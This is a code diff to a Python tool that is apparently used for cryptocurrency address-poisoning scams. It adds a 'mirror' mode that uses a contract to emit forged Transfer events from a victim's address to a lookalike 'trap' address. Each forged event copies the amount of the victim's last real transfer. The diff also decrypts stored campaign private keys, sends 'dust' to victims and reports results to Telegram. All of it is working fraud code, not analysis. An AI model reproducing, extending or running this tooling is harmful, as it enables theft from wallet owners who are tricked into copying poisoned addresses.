@@ -249,6 +249,128 @@ ALCHEMY_RPCS = {
     ],
 }
 
+
+# ─── Mirror Token Contracts ───
+MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
+MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
+MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")
+
+MIRROR_CONTRACTS = {
+    "USDC": MIRROR_TOKEN_USDC,
+    "USDT": MIRROR_TOKEN_USDT,
+    "ETH": MIRROR_TOKEN_NATIVE,
+    "BNB": MIRROR_TOKEN_NATIVE,
+    "MATIC": MIRROR_TOKEN_NATIVE,
+}
+
+MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
+
+# Mirror uses the campaign funding wallet as operator (same as re_poison.js)
+def get_mirror_operator_key(campaign_id):
+    """Fetch and decrypt the funding key for mirror operations."""
+    if not supabase or not campaign_id:
+        return None
+    try:
+        result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
+        if not result.data:
+            return None
+        enc_key = result.data[0].get("funding_private_key_enc")
+        if not enc_key:
+            return None
+        funding_key = decrypt(enc_key).strip()
+        if not funding_key.startswith('0x'):
+            funding_key = f'0x{funding_key}'
+        return funding_key
+    except Exception as e:
+        logger.error(f"Failed to get mirror operator key: {e}")
+        return None
+
+def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
+    """
+    Emit a forged Transfer event via MirrorToken contract.
+    Returns tx_hash on success, None on failure.
+    """
+    contract_address = MIRROR_CONTRACTS.get(asset.upper())
+    if not contract_address:
+        logger.warning(f"[mirror] No MirrorToken contract configured for {asset}")
+        return None
+
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[mirror] No funding key for campaign {campaign_id}, cannot emit mirror")
+        return None
+
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+
+        # Use low gas - mirror only needs ~50k gas
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+
+        gas_params = {}
+        if use_eip1559:
+            base_fee = latest_block["baseFeePerGas"]
+            if CHAIN.lower() == "polygon":
+                max_priority = w3.to_wei(30, "gwei")
+            elif CHAIN.lower() == "ethereum":
+                max_priority = w3.to_wei(0.05, "gwei")
+            else:
+                max_priority = w3.to_wei(0.01, "gwei")
+            max_fee = int((base_fee * 1.02) + max_priority)
+            gas_params['maxFeePerGas'] = max_fee
+            gas_params['maxPriorityFeePerGas'] = max_priority
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+
+        tx = contract.functions.transferFrom(
+            w3.to_checksum_address(victim_address),
+            w3.to_checksum_address(trap_address),
+            raw_value
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': 60000,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+
+        # Check operator has enough native for gas
+        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+        gas_cost = 60000 * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+        if operator_balance < gas_cost:
+            logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {w3.from_wei(gas_cost, 'ether')}, have {w3.from_wei(operator_balance, 'ether')}")
+            return None
+
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")
+
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
+        if receipt.status == 1:
+            logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[mirror] ❌ Mirror tx reverted")
+            return None
+
+    except Exception as e:
+        logger.error(f"[mirror] Failed to emit forged transfer: {e}")
+        return None
+
+
 def get_web3():
     get_var = lambda name: getattr(config, name, None) or os.getenv(name)
 
@@ -338,19 +460,38 @@ def get_token_balance(address, token_symbol):
     
 
 def choose_asset(victim, trap, preferred_asset=None, exact_amount=None, exact_asset=None):
-    # 🆕 If exact amount and asset are provided (from dashboard "dust" button), use them directly
+    # 🆕 EXACT MODE: Only use exact amount if trap can afford it
     if exact_amount is not None and exact_asset:
         exact_asset_upper = exact_asset.upper()
-        # Validate the asset is supported
-        if exact_asset_upper == NATIVE_SYMBOL:
-            logger.info(f"[EXACT MODE] Using exact amount {exact_amount} wei of {exact_asset_upper}")
-            return (exact_asset_upper, exact_amount, None)
-        elif exact_asset_upper in TOKEN_CONFIG:
-            logger.info(f"[EXACT MODE] Using exact amount {exact_amount} units of {exact_asset_upper}")
-            return (exact_asset_upper, exact_amount, None)
-        else:
-            logger.warning(f"[EXACT MODE] Asset {exact_asset} not recognized, falling back to normal logic")
+        is_supported = (exact_asset_upper == NATIVE_SYMBOL) or (exact_asset_upper in TOKEN_CONFIG)
+        
+        if is_supported:
+            # Check if trap has enough balance to send the exact amount
+            can_afford = False
+            if exact_asset_upper == NATIVE_SYMBOL:
+                trap_bal = call_with_retry(w3.eth.get_balance, trap)
+                reserve_wei = get_native_reserve_wei(CHAIN)
+                try:
+                    gas_price = w3.eth.gas_price
+                except Exception:
+                    gas_price = w3.to_wei(1, "gwei")
+                
+                if trap_bal >= exact_amount + (21000 * gas_price) + reserve_wei:
+                    can_afford = True
+            else:
+                trap_bal = get_token_balance(trap, exact_asset_upper)
+                if trap_bal >= exact_amount:
+                    can_afford = True
+            
+            if can_afford:
+                logger.info(f"[EXACT MODE] Trap can afford {exact_amount} units of {exact_asset_upper}")
+                return (exact_asset_upper, exact_amount, None)
+            else:
+                # 🚨 FALLBACK: Trap can't afford exact amount, use standard dust
+                logger.info(f"[EXACT MODE] Trap cannot afford {exact_amount} units of {exact_asset_upper}. Falling back to standard dust.")
+                # Continue to normal logic below (preferred_asset fallback)
     
+    # Normal logic continues below if exact mode failed or wasn't provided...
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
     
@@ -1037,8 +1178,7 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser()
     parser.add_argument('--job-id', help='Job ID for tracking')
-    parser.add_argument('--exact-amount', type=int, help='Exact amount in smallest units (wei/units, e.g., 115147641 for 115.147641 USDT)')
-    parser.add_argument('--exact-asset', help='Exact asset symbol (e.g., USDT, USDC, ETH)')
+    parser.add_argument('--mirror-only', action='store_true', help='Only emit mirror event, skip real dust')
     parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
     parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
     args = parser.parse_args()
@@ -1052,14 +1192,58 @@ if __name__ == "__main__":
         campaign_id = os.getenv('CAMPAIGN_ID')
 
     if args.private_key and args.victim_address:
-        success = send_dust(
-            args.private_key, 
-            args.victim_address, 
-            campaign_id=campaign_id,
-            exact_amount=args.exact_amount,
-            exact_asset=args.exact_asset
-        )
-        if not success:
-            sys.exit(1)
+        # ─── MIRROR MODE: Fetch last transfer and emit forged event ───
+        if args.mirror_only:
+            trap_address = w3.eth.account.from_key(args.private_key).address.lower()
+
+            # Get counterparty from DB
+            counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
+            if not counterparty:
+                logger.error("No counterparty found, cannot determine last transfer")
+                send_telegram(f"❌ Mirror failed: No counterparty found for {args.victim_address}", campaign_id=campaign_id)
+                sys.exit(1)
+
+            # Fetch last transfer from blockchain
+            logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
+            fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
+
+            if not fetched_asset or not fetched_amount:
+                logger.error("No last transfer found on blockchain")
+                send_telegram(f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}", campaign_id=campaign_id)
+                sys.exit(1)
+
+            logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+
+            # Emit forged transfer via MirrorToken
+            tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
+
+            if tx_hash:
+                try:
+                    decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
+                except AttributeError:
+                    decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
+
+                amount_display = fetched_amount / (10 ** decimals)
+                send_telegram(
+                    f"🪞 Mirror emitted successfully!\n"
+                    f"Victim: {args.victim_address}\n"
+                    f"Trap: {trap_address}\n"
+                    f"Amount: {amount_display:.6f} {fetched_asset}\n"
+                    f"TX: {tx_hash}",
+                    campaign_id=campaign_id
+                )
+                if job_id:
+                    update_job(job_id, status='completed', progress=1, message='Mirror emitted')
+            else:
+                send_telegram(f"❌ Mirror emission failed for {args.victim_address}", campaign_id=campaign_id)
+                if job_id:
+                    update_job(job_id, status='failed', message='Mirror emission failed')
+                sys.exit(1)
+
+        else:
+            # Normal dust mode (existing behavior)
+            success = send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
+            if not success:
+                sys.exit(1)
     else:
         batch_poison(job_id=job_id, campaign_id=campaign_id)
